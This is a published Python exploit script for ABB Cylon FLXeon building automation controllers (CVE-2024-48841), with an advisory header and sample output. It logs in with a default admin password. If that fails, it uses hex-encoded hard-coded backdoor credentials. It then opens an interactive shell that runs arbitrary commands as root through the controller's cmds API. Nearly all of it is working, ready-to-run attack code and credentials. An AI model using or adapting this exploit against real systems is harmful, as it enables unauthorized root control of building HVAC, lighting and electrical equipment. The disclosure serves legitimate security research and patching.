@@ -1,0 +1,181 @@
+id: 39892
+date: 02/03/2025
+title: ABB Cylon FLXeon 9.3.4 cmds.js Authenticated Root Remote Code Execution Exploit
+author: LiquidWorm
+cves: CVE-2024-48841
+
+#!/usr/bin/env python3
+#
+#
+# ABB Cylon FLXeon 9.3.4 (cmds.js) Authenticated Root Remote Code Execution
+# 
+# 
+# Vendor: ABB Ltd.
+# Product web page: https://www.global.abb                   
+# Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+#                   CBX Series (FLX Series)
+#                   CBT Series
+#                   CBV Series
+#                   Firmware: <=9.3.4
+# 
+# Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+# series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+# building management solutions. ABB BACnet controllers are designed for intelligent
+# control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+# heat pump systems, air handling units (constant volume, variable air volume, and
+# multi-zone), rooftop units, electrical systems such as lighting control, variable
+# frequency drives and metering.
+# 
+# The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+# connectivity and open integration for your building automation systems. It's scalable,
+# and modular, allowing you to control a diverse range of HVAC functions.
+# 
+# Desc: The ABB Cylon FLXeon BAS controller is vulnerable to authenticated root command
+# execution via the cmds API. An authenticated attacker can execute arbitrary system
+# commands with root privileges.
+#
+# ----------------------------------------------------------------------------------
+# $ ./cmdsapi.py https://7.3.3.1
+# Logged in as admin (admin).
+# # id
+# uid=0(root) gid=0(root) groups=0(root)
+# # exit
+# Cheers!
+# ----------------------------------------------------------------------------------
+# 
+# Tested on: Linux Kernel 5.4.27
+#            Linux Kernel 4.15.13
+#            NodeJS/8.4.0
+#            Express
+# 
+# 
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5908
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5908.php
+# CVE ID: CVE-2024-48841
+# CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48841
+#
+#
+# 21.04.2024
+#
+#
+
+import sys
+import urllib3
+import requests
+from urllib.parse import urljoin
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+DEFAULT_PORT = 443
+LOGIN_ENDPOINT = "/api/login"
+CMDS_ENDPOINT = "/api/cmds"
+
+proj = r"""
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+                                         
+            ABB Cylon FLXeon Series <=9.3.4
+             Remote Root Command Execution
+                     ZSL-2025-5908
+"""
+
+def usage():
+    print(proj)
+    print("Usage: ./cmdsapi.py <target>")
+
+def get_url(target):
+    if not target.startswith(("https://", "http://")):
+        target = f"https://{target}"
+    if ":" not in target.split("//")[1]:
+        target = f"{target}:{DEFAULT_PORT}"
+    return target
+
+def auth(url, usr, pwd):
+    login_url = urljoin(url, LOGIN_ENDPOINT)
+    payload = {"username": usr, "password": pwd}
+    sess = requests.session()
+
+    try:
+        r = sess.post(login_url, json=payload, verify=False)
+        if r.status_code == 401 or r.text == "Unauthorized":
+            print(f"Auth failed for {usr}: Unauthorized")
+            return None
+        elif r.status_code == 200:
+            userID = r.json().get("id")
+            if userID == "admin":
+                print(f"Logged in as admin ({usr}).")
+            else:
+                print(f"Logged in as {userID} ({usr}).")
+            return sess
+        else:
+            print("Unexpected.")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"Auth error: {e}")
+        return None
+
+def exec(sess, url, cmd):
+    cmds_url = urljoin(url, CMDS_ENDPOINT)
+    payload = {"cmd": cmd}
+
+    try:
+        r = sess.post(cmds_url, json=payload, verify=False)
+        if r.status_code == 200:
+            result = r.json().get("result", "Resultless!")
+            print(result, end="")
+        else:
+            print(f"cmd exec failed: {r.status_code} - {r.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"cmd exec error: {e}")
+
+def main():
+    if len(sys.argv) != 2:
+        usage()
+        sys.exit(1)
+    target = sys.argv[1].strip()
+    url = get_url(target)
+    sess = auth(url, "admin", "cylonctl")
+    if not sess:
+        print("Trying backdoor access...")
+        back,door = "\x63\x78\x70\x72\x6F","\x73\x69\x74\x65\x67\x75\x69\x64\x65"
+        sess = auth(url, back, door)
+        if not sess:
+            print("Backdoor access failed :(")
+            sys.exit(1)
+    while True:
+        cmd = input("# ").strip()
+        if cmd.lower() == "exit":
+            print("Cheers!")
+            break
+        exec(sess, url, cmd)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2025-02-07]  #
